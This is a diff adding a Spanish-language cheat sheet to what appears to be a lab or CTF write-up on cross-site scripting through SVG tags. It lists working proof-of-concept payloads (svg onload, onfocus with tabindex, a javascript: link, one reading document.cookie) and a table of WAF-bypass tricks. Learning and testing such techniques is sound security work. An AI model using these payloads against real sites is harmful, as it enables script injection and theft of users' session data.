@@ -44,7 +44,123 @@ Probamos el payload pero vemos que el atributo onload es bloqueado:
 ![image](https://github.com/user-attachments/assets/776bb23a-6f73-4202-9568-c9593f3dd206)
 
 
+---
 
+# 🧠 Guía Completa de XSS usando `<svg>`
+
+## 🧩 ¿Por qué `<svg>` es útil para XSS?
+
+`<svg>` es una etiqueta válida de HTML5 usada para gráficos vectoriales.  
+Lo interesante es que el navegador la permite aunque el WAF (Firewall) bloquee etiquetas clásicas como `<script>`, `<img>`, etc.
+
+Además, **dentro de un `<svg>` podés insertar eventos de JavaScript**, como `onload`, `onmouseover`, etc., lo que la hace una excelente herramienta para bypass.
+
+---
+
+## 🧪 Casos básicos de XSS con `<svg>`
+
+### 1. 🧨 Payload mínimo funcional:
+
+```html
+<svg onload=alert(1)>
+```
+
+- `onload`: se ejecuta apenas el navegador carga el SVG.
+
+---
+
+### 2. 🔥 Payload dentro de una URL (reflected XSS):
+
+```url
+?search=<svg%20onload=alert(1)>
+```
+
+- `%20` es espacio, el navegador lo decodifica al mostrarlo.
+
+---
+
+### 3. 🛠️ Payload más elaborado con atributos adicionales:
+
+```html
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+```
+
+- `xmlns`: hace que el SVG sea completamente válido.
+- `document.domain`: otra forma de probar que se ejecuta JS.
+
+---
+
+## 💡 ¿Qué eventos podés usar?
+
+- `onload` ✅ → apenas se carga.
+- `onmouseover` ✅ → cuando pasás el mouse.
+- `onfocus` ✅ → cuando hacés foco (útil con `tabindex`).
+- `onclick` ✅ → cuando hacés click.
+
+```html
+<svg onclick=alert(1)>Click me</svg>
+```
+
+---
+
+## 🎯 Casos reales de bypass con `<svg>`
+
+### ✅ Bypass cuando `<script>` está bloqueado:
+
+```html
+<svg/onload=alert(1)>
+```
+
+### ✅ Payload sin paréntesis:
+
+```html
+<svg onload=confirm`${document.cookie}`>
+```
+
+### ✅ Payload ofuscado:
+
+```html
+<svg %0Aonload=alert(1)>
+```
+
+---
+
+## 💡 Pro Tips
+
+| Caso | Técnica |
+|------|---------|
+| WAF bloquea `<script>` | Usá `<svg onload=...>` |
+| WAF bloquea paréntesis | Usá template strings: \`${...}\` |
+| WAF bloquea `"`, `'` | Usá backticks o sin comillas |
+| Quieren que se dispare solo | `onload` o `autofocus + #hash` |
+
+---
+
+## 🧪 Práctica rápida
+
+```url
+?search=<svg%20onload=alert(document.domain)>
+```
+
+```url
+?search=<svg%20id=x%20onfocus=alert(1)%20tabindex=1>#x
+```
+
+---
+
+## 🧱 Si tenés un WAF muy fuerte...
+
+```html
+<svg><script>alert(1)</script></svg>
+```
+
+```html
+<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
+```
+
+> Ojo: no todos los navegadores modernos permiten `javascript:` dentro de SVGs hoy.
+
+---
 
 
 
